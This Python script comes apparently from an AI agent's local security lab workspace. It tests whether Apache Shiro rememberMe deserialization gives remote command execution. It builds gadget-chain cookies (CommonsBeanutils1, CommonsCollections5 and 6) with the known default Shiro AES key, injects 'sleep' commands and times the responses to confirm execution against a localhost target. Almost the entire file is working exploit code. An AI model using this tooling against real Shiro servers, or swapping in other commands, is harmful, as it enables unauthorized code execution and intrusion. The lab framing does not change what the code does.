#!/usr/bin/env python3
# loop3 t7 C1 — 计时 oracle：RCE 是否真的发生？
# 原理：若 gadget 链执行了命令，则 sleep N 会让 HTTP 响应时间增加约 N 秒。
#       完全只读（不写文件、不联网），不受"deleteMe 只是解密失败标志"的干扰。
import json, os, subprocess, sys, time, datetime, statistics
import requests

CWD = r"C:\Users\Administrator\Documents\deepseek-harness\default-workspace"
SHIRO = "http://127.0.0.1:18081/"
UA = "loop3-t7/1.0 (authorized local lab)"
OUT_PATH = os.path.join(CWD, r"security\learning\_evidence\loop3-t7-c1-timing-20261012.json")
OUT = {"ts": datetime.datetime.now().isoformat(), "steps": [], "timings": []}


def rec(n, **kw):
    OUT["steps"].append({"step": n, **kw})
    print(f"--- {n}: " + json.dumps(kw, ensure_ascii=False)[:600], flush=True)
    return kw


def kali(cmd):
    r = subprocess.run([sys.executable, r"dsh-tools\kali-run.py", cmd],
                       capture_output=True, text=True, cwd=CWD)
    return (r.stdout + r.stderr).strip()


def gen(chain, cmd, outfile):
    return kali(f"ruby /tmp/t7-c1-shiro-gen.rb {chain} '{cmd}' {outfile} 'kPH+bIxk5D2deZiIxcaaaA==' 2>&1")


def cookie_of(f):
    lines = [l for l in kali(f"cat {f}").splitlines() if l.strip()]
    return lines[0].strip() if lines else ""


def timed(label, ck, timeout=40):
    time.sleep(1.2)
    t0 = time.time()
    try:
        r = requests.get(SHIRO, headers={"User-Agent": UA, "Cookie": "rememberMe=" + ck},
                         timeout=timeout, allow_redirects=False)
        dt = time.time() - t0
        d = rec(label, status=r.status_code, elapsed_s=round(dt, 3),
                deleteMe=("rememberMe=deleteMe" in r.headers.get("Set-Cookie", "")))
    except Exception as e:
        dt = time.time() - t0
        d = rec(label, error=repr(e)[:120], elapsed_s=round(dt, 3))
    OUT["timings"].append({"label": label, **d})
    return dt


SLEEP_N = 6
print("=" * 74)
# 0) 基线：无 cookie / 无害明文（sleep 0 的等价物）
base = [timed(f"T0_baseline_nocookie_{i}", "") for i in range(2)]
base_ms = statistics.mean(base)
print(f">>> baseline mean = {base_ms:.3f}s", flush=True)

# 1) 每条链：sleep 0（对照） vs sleep N（若真执行 → +N 秒）
for chain in ("CommonsBeanutils1", "CommonsCollections5", "CommonsCollections6"):
    f0 = f"/tmp/t7-t-{chain}-0.txt"
    fn = f"/tmp/t7-t-{chain}-N.txt"
    gen(chain, "sleep 0", f0)
    gen(chain, "sleep %d" % SLEEP_N, fn)
    c0 = cookie_of(f0)
    cn = cookie_of(fn)
    rec(f"gen_{chain}", cookie0_len=len(c0), cookieN_len=len(cn))
    if not c0 or not cn:
        rec(f"SKIP_{chain}", reason="cookie empty")
        continue
    t_ctl = timed(f"T_{chain}_sleep0_control", c0)
    t_slp = timed(f"T_{chain}_sleep{SLEEP_N}_test", cn)
    executed = (t_slp - t_ctl) > (SLEEP_N * 0.6)
    rec(f"VERDICT_{chain}", t_control=round(t_ctl, 3), t_test=round(t_slp, 3),
        delta=round(t_slp - t_ctl, 3), expected_delta_if_exec=SLEEP_N,
        executed=executed)
    print(f"=== {chain}: ctl={t_ctl:.2f}s test={t_slp:.2f}s delta={t_slp-t_ctl:+.2f}s executed={executed}", flush=True)

with open(OUT_PATH, "w", encoding="utf-8") as f:
    json.dump(OUT, f, ensure_ascii=False, indent=1)
print(json.dumps({"rc": "ok", "timings": len(OUT["timings"])}))
